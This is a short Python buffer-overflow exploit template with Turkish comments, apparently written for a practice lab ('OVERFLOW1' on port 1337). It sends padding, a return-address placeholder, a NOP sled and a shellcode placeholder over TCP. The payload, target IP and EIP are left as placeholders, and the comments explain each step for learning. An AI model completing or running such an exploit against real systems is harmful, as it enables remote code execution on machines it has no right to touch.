#!/usr/bin/env python3
# Python 3 ile çalıştırılması gerektiğini belirtir.

import sys 
import time 
import socket
# 'sys', 'time' ve 'socket' modülleri import ediliyor.
# - 'sys': Sistem işlemleri için kullanılır (örneğin, betiği sonlandırmak).
# - 'time': Bekleme süreleri için kullanılır.
# - 'socket': Ağ bağlantıları ve veri iletişimi için kullanılır.

ip = "IP_ADDRESS"  # Hedef makinenin IP adresi. Bu IP'yi kendi test ortamınıza göre değiştirmelisiniz.
port = 1337  # Hedef port. Bu, hedef uygulamanın dinlediği portu temsil ediyor. Portu da değiştirebilirsiniz.
timeout = 5  # Bağlantının zaman aşımı süresi. 5 saniye boyunca yanıt gelmezse bağlantı sonlanacak.

buf = "SHELL_CODE"  # Bu değişken, kabuk kodunu (shellcode) içeriyor. Zararlı kodlar veya belirli bir komutun çalıştırılması için kullanılır.
# Aşağıdaki satırlar, exploit sırasında kullanılacak olan shellcode'u (kabuk kodunu) hex formatında içerir.

# Bu kodların tamamı hedefe gönderilecek shellcode'u (zararlı kodu) içeriyor. Bu, muhtemelen bir sisteme sızmak veya belirli bir komutu çalıştırmak için kullanılır.

prefix = "OVERFLOW1 "  # Komutun başına eklenecek bir ön ek. Bu, hedef uygulamaya uygun bir komut ya da formatı olabilir.
string = prefix + "A"*1978 + "EIP_VALUE" + "\x90"*16 + buf  # Gönderilecek veriyi tanımlar. 
# - 1978 baytlık 'A' karakteri buffer overflow oluşturmak için.
# - "EIP_VALUE": Bu, **return address** (geri dönüş adresi) olarak kullanılır. Kodun nereye atlayacağını belirtir.
# - "\x90"*16: Bu, **NOP sled** olarak bilinir. Kodun atlama noktasından shellcode'a güvenli bir şekilde ulaşmasını sağlar. 
# - 'buf': Hedef sistemde çalıştırılacak shellcode.

try:
    # Hata oluşmazsa çalıştırılacak kodlar burada yer alıyor.
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # TCP bağlantısı açılıyor.
        s.settimeout(timeout)
        # Bağlantı için zaman aşımı 5 saniye olarak ayarlandı.
        s.connect((ip, port))
        # IP ve port'a bağlanılıyor.
        s.send(bytes(string, "latin-1"))
        # Veri gönderiliyor. Gönderilecek veri 'latin-1' formatında kodlanıyor.
except:
    # Eğer bağlantı kurulamazsa ya da hata olursa, bu blok çalışıyor.
    print("Bağlanılamadı")
    # Hata mesajı olarak "Could not connect" yazdırılıyor.
